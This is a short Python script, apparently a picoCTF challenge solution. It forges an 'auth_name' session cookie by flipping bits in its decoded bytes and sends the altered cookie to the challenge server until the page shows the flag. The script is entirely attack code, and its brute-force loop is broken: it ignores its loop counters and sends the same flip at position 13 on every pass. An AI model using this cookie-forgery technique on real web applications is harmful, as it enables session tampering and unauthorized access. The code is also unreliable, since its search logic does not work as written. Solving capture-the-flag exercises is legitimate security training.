import requests, sys
from base64 import b64decode
from base64 import b64encode

def bitFlip(pos, bit, data):
    raw = b64decode(data)
    list1 = list(raw.decode('utf-8'))
    #print(list1)
    list1[pos] = chr(ord(list1[pos])^bit)
    #print(list1)
    raw = ''.join(list1)
    return b64encode(raw.encode('utf-8'))

start =int(sys.argv[1])
cookie_str ="dmxDMTVaQnVydEw2aXVnRTFMeDEwempFbTZ0RUFxQjhPVXkzY24rcVQrdWlkeFZieWlHOWk3RWhqV1dacGpBRG83cmp3QUhVRFJ6cXl5emlFWDM3aktWek5tSUF0eFpzQUNXZHRDRzhJdTl6S0F1TDU2NHhkSTV1dDdzQVh6ZEs="

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-GPC': '1',
    'Referer': 'http://mercury.picoctf.net:43275/',
    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
}

for i in range(start, 128):
    for j in range(0,128):
        ctx = bitFlip(13,94,cookie_str).decode('utf-8')
        response = requests.get('http://mercury.picoctf.net:43275/', headers=headers, cookies={ 'auth_name': ctx }, verify=False)
        #print(cookie_str)
        #print(ctx)
        if response.text.find("Cannot decode cookie") != -1:
            print(str(i), str(j), "cannot decode")
            #print("boo")
        else:
            if response.text.find("picoCTF{") != -1:
                print("FOUND", response.text.find("picoCTF{"))
                print(response.text)
                exit(0)
            print(str(i), str(j), "Check this", ctx)
            #print(response.text)
